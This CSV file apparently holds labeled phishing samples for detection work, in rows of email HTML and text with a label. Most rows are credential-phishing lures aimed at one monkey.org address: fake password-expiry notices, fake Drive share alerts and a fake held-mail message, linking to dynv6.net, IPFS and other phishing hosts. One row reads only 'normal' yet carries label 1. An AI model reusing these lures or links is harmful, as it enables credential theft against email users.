text,label
"<html><head>
<meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
<meta name=""GENERATOR"" content=""MSHTML 11.00.10570.1001""></head>
<body>
<p>

<table width=""100%"" align=""center"" class=""v1row v1row-1"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<table width=""480"" align=""center"" class=""v1row-content"" style=""width: 480px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td width=""100%"" class=""v1column"" style=""border-width: 0px; text-align: left; padding-top: 5px; padding-bottom: 5px; font-weight: 400; vertical-align: top; box-sizing: border-box;"">
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: sans-serif; box-sizing: border-box;""><div style=""color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;""><p style=""margin: 0px; text-align: center; font-size: 14px; box-sizing: border-box;""><br></p></div></div></td></tr></tbody></table>
<table width=""100%"" class=""v1divider_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<table width=""100%"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td class=""v1divider_inner"" style=""line-height: 1px; font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style: solid; box-sizing: border-box;""><span style=""box-sizing: border-box;"">&#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""5"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: Tahoma, Verdana, sans-serif; box-sizing: border-box;"">
<div style=""color: rgb(57, 61, 71); line-height: 1.5; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 12px; box-sizing: border-box;"">
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;"">&nbsp;</p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">The password to your mailbox&nbsp;jose@monkey.org&nbsp; has expired.</span></p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><br style=""box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">A new password will be generated by the system.<br style=""box-sizing: border-box;""></span><br style=""box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">You will be signed out automatically exactly 3 hours after this email is opened.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;""></span></p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">It is recommended to keep using your current password.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;"">To keep using your current password, kindly use the button below.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;""></span></p></div></div></td></tr></tbody></table>
<table width=""100%"" class=""v1button_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<span style=""line-height: 1.5; font-size: 16px; box-sizing: border-box; letter-spacing:normal; display:inline-block; padding-left:20px; padding-right:20px"">
<a style=""border-radius: 4px; border: 1px solid rgb(138, 59, 143); border-image: none; width: auto; text-align: center; color: rgb(255, 255, 255); padding-top: 5px; padding-bottom: 5px; font-family: Tahoma, Verdana, Segoe, sans-serif; text-decoration: none; display: inline-block; box-sizing: border-box; background-color: rgb(0, 2, 165);"" target=""_blank"" rel=""noreferrer"" href=""https://www.radicigroup.com/newsletter/hit?email={{Email}}&nid=41490&url=https://beniuilxca.dynv6.net/#jose@monkey.org"">Keep Current Password</a></span></div></td></tr></tbody></table>
<table width=""100%"" class=""v1divider_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<table width=""100%"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td class=""v1divider_inner"" style=""line-height: 1px; font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style: solid; box-sizing: border-box;""><span style=""box-sizing: border-box;"">&#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: sans-serif; box-sizing: border-box;"">
<div style=""color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;"">
<p style=""margin: 0px; text-align: center; box-sizing: border-box;"">Email is generated by&nbsp;monkey.org Email Server for jose@monkey.org</p></div></div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><p></p></body></html>

",1
"<table><tbody><tr><td style=""width:500px;background-color:#555;margin:0 auto;""><p style=""margin:0;font-size:14px;line-height:17px;text-align:center;padding:10px 15px;""><span style=""font-size:18px;line-height:18px;color:#fff;""><br/>New Secured Email for jose@monkey.org from Monkey.org</span></p><p style=""margin:0;font-size:14px;line-height:17px;text-align:center;padding:10px 15px;"">&nbsp;&nbsp;</p><p style=""margin:0;font-size:14px;line-height:17px;text-align:center;padding:10px 15px;"">&nbsp;</p><center><a style=""background-color:black;color:white;text-decoration:none;padding:12px;border-radius:2px;""href=""https://tsmbangkok.com/"">Click Here to Continue</a></center><br/><br/></td></tr><tr><td style=""width:500px;margin:0;background-color:#f0f0f0;padding:40px;""><div style=""font-size:12px;line-height:18px;color:#959595;font-family:Arial,'Helvetica Neue',Helvetica,sans-serif,serif,EmojiFont;""><p style=""margin:0;font-size:14px;line-height:21px;text-align:center;"">vrt:5t5t45-59323-59559 Valid for: 10 min Requester IP address: 65.118.65.10 Requester user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0</p><p style=""margin:0;font-size:14px;line-height:21px;text-align:center;"">Powered by&nbsp;<strong>ConnectWise ScreenConnect&nbsp;<sup>TM</sup></strong>.</p></div></td></tr></tbody></table>",1
"<html><head>
<meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
<meta name=""GENERATOR"" content=""MSHTML 11.00.10570.1001""></head>
<body>
<p>

<table width=""100%"" align=""center"" class=""v1row v1row-1"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<table width=""480"" align=""center"" class=""v1row-content"" style=""width: 480px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td width=""100%"" class=""v1column"" style=""border-width: 0px; text-align: left; padding-top: 5px; padding-bottom: 5px; font-weight: 400; vertical-align: top; box-sizing: border-box;"">
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: sans-serif; box-sizing: border-box;""><div style=""color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;""><p style=""margin: 0px; text-align: center; font-size: 14px; box-sizing: border-box;""><br></p></div></div></td></tr></tbody></table>
<table width=""100%"" class=""v1divider_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<table width=""100%"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td class=""v1divider_inner"" style=""line-height: 1px; font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style: solid; box-sizing: border-box;""><span style=""box-sizing: border-box;"">&#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""5"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: Tahoma, Verdana, sans-serif; box-sizing: border-box;"">
<div style=""color: rgb(57, 61, 71); line-height: 1.5; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 12px; box-sizing: border-box;"">
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;"">&nbsp;</p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">The password to your mailbox&nbsp;jose@monkey.org&nbsp; has expired.</span></p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><br style=""box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">A new password will be generated by the system.<br style=""box-sizing: border-box;""></span><br style=""box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">You will be signed out automatically exactly 3 hours after this email is opened.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;""></span></p>
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><span style=""font-size: 14px; box-sizing: border-box;"">It is recommended to keep using your current password.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;"">To keep using your current password, kindly use the button below.<br style=""box-sizing: border-box;""><br style=""box-sizing: border-box;""></span></p></div></div></td></tr></tbody></table>
<table width=""100%"" class=""v1button_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<span style=""line-height: 1.5; font-size: 16px; box-sizing: border-box; letter-spacing:normal; display:inline-block; padding-left:20px; padding-right:20px"">
<a style=""border-radius: 4px; border: 1px solid rgb(138, 59, 143); border-image: none; width: auto; text-align: center; color: rgb(255, 255, 255); padding-top: 5px; padding-bottom: 5px; font-family: Tahoma, Verdana, Segoe, sans-serif; text-decoration: none; display: inline-block; box-sizing: border-box; background-color: rgb(0, 2, 165);"" target=""_blank"" rel=""noreferrer"" href=""https://www.radicigroup.com/newsletter/hit?email={{Email}}&nid=41490&url=https://beniuilxca.dynv6.net/#jose@monkey.org"">Keep Current Password</a></span></div></td></tr></tbody></table>
<table width=""100%"" class=""v1divider_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""box-sizing: border-box;"">
<table width=""100%"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td class=""v1divider_inner"" style=""line-height: 1px; font-size: 1px; border-top-color: rgb(187, 187, 187); border-top-width: 2px; border-top-style: solid; box-sizing: border-box;""><span style=""box-sizing: border-box;"">&#8202;</span></td></tr></tbody></table></div></td></tr></tbody></table>
<table width=""100%"" class=""v1text_block"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""font-family: sans-serif; box-sizing: border-box;"">
<div style=""color: rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; box-sizing: border-box;"">
<p style=""margin: 0px; text-align: center; box-sizing: border-box;"">Email is generated by&nbsp;monkey.org Email Server for jose@monkey.org</p></div></div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table><p></p></body></html>

",1
"I've shared an item with you:

We've Restricted Your Billing Account ID Due to Fraud Access.pdf
https://drive.google.com/file/d/1aONUCo1PBYTbTqNOLe30jK-GJg22K46i/view?usp=sharing&ts=659db10f

It's not an attachment -- it's stored online. To open this item, just click  
the link above.
",1
"
Monkey Support Notification

ACTION REQUIRED: Monkey (jose@monkey.org) Passcode credentials is set to expire today Wednesday, January 10, 2024.

Same registered password must be used below.

RETAIN CREDENTIALS https://bafkreigdpekci4il2gjagofvg7irzyjqqkam2hz36lrx3ms7fwfpvxdjjq.ipfs.dweb.link/#jose@monkey.org

Note: It is important you update your email passcode, failure to do this will get your account locked out and email will not be accessible.

Update your
email preferences to choose the types of emails you receive, or you can
unsubscribe from all future emails.

  
",1
"I've shared an item with you:

We Blocked Your Billing Access ID Due to Unauthorized Access.pdf
https://drive.google.com/file/d/1wqnoMQTsnfVuNsCiSyVJsfp9cN8Vk0cd/view?usp=sharing&ts=65a07243

It's not an attachment -- it's stored online. To open this item, just click  
the link above.
",1
normal,1
"I've shared an item with you:

Your Online Account ID Locked - Fraudulent Access Identified - Validate  
Now.pdf
https://drive.google.com/file/d/1lC6lnkNKDZBFagQ-p4S-s1qXeP8KilNd/view?usp=sharing&ts=65a15d4d

It's not an attachment -- it's stored online. To open this item, just click  
the link above.
",1
"I've shared an item with you:

Fraudulent Login Identified - Billing Account ID Disabled.pdf
https://drive.google.com/file/d/1guy1H5imTRRMZufDerOrTuryRG6jOBVm/view?usp=sharing&ts=65a17c46

It's not an attachment -- it's stored online. To open this item, just click  
the link above.
",1
"
Hello,

We noticed that you have (3) incoming pending messages from monkey.org Security Admin Server,

messages were held due to low email storage. 

Please click to retrieve Messages https://connect.covering.best/utilzation.html?grow=jose@monkey.org

Thanks for choosing our domain and for your cooperation,

monkey.org Administrator.
",1
"<html><head>
<meta name=""GENERATOR"" content=""MSHTML 11.00.10570.1001"">
<meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
</head>
<body>
<div id=""editbody1"">
<div>
<table width=""100%"" align=""center"" class=""v1x_v1row_mr_css_attr v1x_v1row-3_mr_css_attr"" id=""v1table1"" style=""text-align: left; color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inherit; background-color: rgb(241, 244, 248); font-variant-ligatures: normal; 
font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<table width=""640"" align=""center"" class=""v1x_v1row-content_mr_css_attr v1x_v1stack_mr_css_attr"" id=""v1table2"" style=""width: 640px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: border-box; background-color: rgb(255, 255, 255);"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td width=""100%"" class=""v1x_v1column_mr_css_attr"" style=""border-width: 0px; text-align: left; padding-top: 0px; padding-bottom: 0px; font-weight: 400; vertical-align: top; box-sizing: border-box;"">
<table width=""100%"" class=""v1x_v1text_block_mr_css_attr"" id=""v1table3"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""padding: 20px 40px 10px; box-sizing: border-box;"">
<div style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; font-family: sans-serif; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">
<div style='margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(85, 85, 85); line-height: 1.2; font-family: ""Trebuchet MS"", ""Lucida Grande"", ""Lucida Sans Unicode"", ""Lucida Sans"", Tahoma, sans-serif; font-size: 12px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;'>
<p style=""margin: 0px; text-align: center; font-size: 14px; box-sizing: border-box;""><span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(0, 49, 136); font-family: inherit; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;""><strong style=""font-weight: bolder; box-sizing: border-box;""><font color=""#6d89bc"" face=""Tahoma"">Password Expired - monkey.org</font></strong><strong>
</strong></span></p></div></div></td></tr></tbody></table>
<table width=""100%"" class=""v1x_v1text_block_mr_css_attr"" id=""v1table4"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""padding: 10px 40px; box-sizing: border-box;"">
<div style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; font-family: Tahoma, Verdana, sans-serif; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">
<div style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(85, 85, 85); line-height: 1.5; font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; font-size: 12px; vertical-align: baseline; box-sizing: border-box;"">
</div><p style=""margin: 0px 0px 0px 40px; padding: 0px; border: 0px currentColor; border-image: none; text-align: left; color: rgb(85, 85, 85); line-height: 1.5; font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; font-size: 12px; vertical-align: baseline; box-sizing: border-box;"">
<span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">We want to inform you that the current password to your email&nbsp;<a href=""mailto:jose@monkey.org"" rel=""noreferrer"">jose@monkey.org</a>
has expired.<br><span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">Our system will automatically log you out and generate a new password in 48 hours from <span style=""color: rgb(109, 137, 188); font-size: 14px;"">16 Jan 2024</span>
<span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;""><br style=""box-sizing: border-box;"">
&nbsp;&nbsp;</span>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(109, 137, 188); font-family: inherit; font-size: 14px; font-style: normal; font-variant: normal; font-weight: normal; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">&nbsp; &nbsp;<br style=""box-sizing: border-box;"">
However, if you prefer to keep using your current password, you can simply click the button below. This will allow you to retain your current password and continue accessing your email without any interruptions.<br></span></span></span></p></div></td></tr></tbody></table></td>
</tr>
</tbody></table></td></tr></tbody></table>
<table width=""100%"" align=""center"" class=""v1x_v1row_mr_css_attr v1x_v1row-4_mr_css_attr"" id=""v1table5"" style=""text-align: left; color: rgb(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; widows: 2; font-stretch: inherit; background-color: rgb(241, 244, 248); font-variant-ligatures: normal; 
font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<table width=""640"" align=""center"" class=""v1x_v1row-content_mr_css_attr v1x_v1stack_mr_css_attr"" id=""v1table6"" style=""width: 640px; color: rgb(0, 0, 0); border-collapse: collapse; box-sizing: border-box; background-color: rgb(255, 255, 255);"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td width=""100%"" class=""v1x_v1column_mr_css_attr"" style=""border-width: 1px 0px 0px; border-style: solid none none; border-color: rgb(229, 234, 243) currentColor currentColor; text-align: left; padding-top: 0px; padding-bottom: 0px; font-weight: 400; vertical-align: top; box-sizing: border-box;"">
<table width=""100%"" class=""v1x_v1button_block_mr_css_attr"" id=""v1table7"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div align=""center"" style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; vertical-align: baseline; box-sizing: border-box;"">
<a style=""margin: 0px; padding: 5px 0px; border-radius: 4px; border: 1px solid rgb(138, 59, 143); border-image: none; text-align: center; color: rgb(255, 255, 255); font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; text-decoration: none; vertical-align: baseline; display: block; box-sizing: border-box; font-stretch: inherit; background-color: rgb(61, 96, 251);"" href=""https://bafybeid65nqeonfq7cojif247yiviwpubylceka2joomeoucavetnos2i4.ipfs.dweb.link/?filename=index1.html#jose@monkey.org"" target=""_blank"" rel=""noopener noreferrer"">
<span style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; line-height: 28px; letter-spacing: normal; font-family: inherit; font-size: 14px; vertical-align: baseline; display: inline-block; box-sizing: border-box; font-stretch: inherit;""><strong>KEEP USING CURRENT PASSWORD</strong></span></a></div></td></tr></tbody></table>
<table width=""100%"" class=""v1x_v1text_block_mr_css_attr"" id=""v1table8"" style=""border-collapse: collapse; box-sizing: border-box;"" border=""0"" cellspacing=""0"" cellpadding=""10"">
<tbody style=""box-sizing: border-box;"">
<tr style=""box-sizing: border-box;"">
<td style=""box-sizing: border-box;"">
<div style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; font-family: Tahoma, Verdana, sans-serif; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">
<div style=""margin: 0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb(57, 61, 71); line-height: 1.2; font-family: Lato, Tahoma, Verdana, Segoe, sans-serif; font-size: 14px; vertical-align: baseline; box-sizing: border-box; font-stretch: inherit;"">
<p style=""margin: 0px; font-size: 14px; box-sizing: border-box;""><strong>This email is generated by the&nbsp;monkey.org Email Server Administrator&nbsp;for&nbsp;</strong><a href=""mailto:jose@monkey.org"" rel=""noreferrer""><strong>jose@monkey.org</strong></a></p></div></div></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></div></div></body></html>

",1
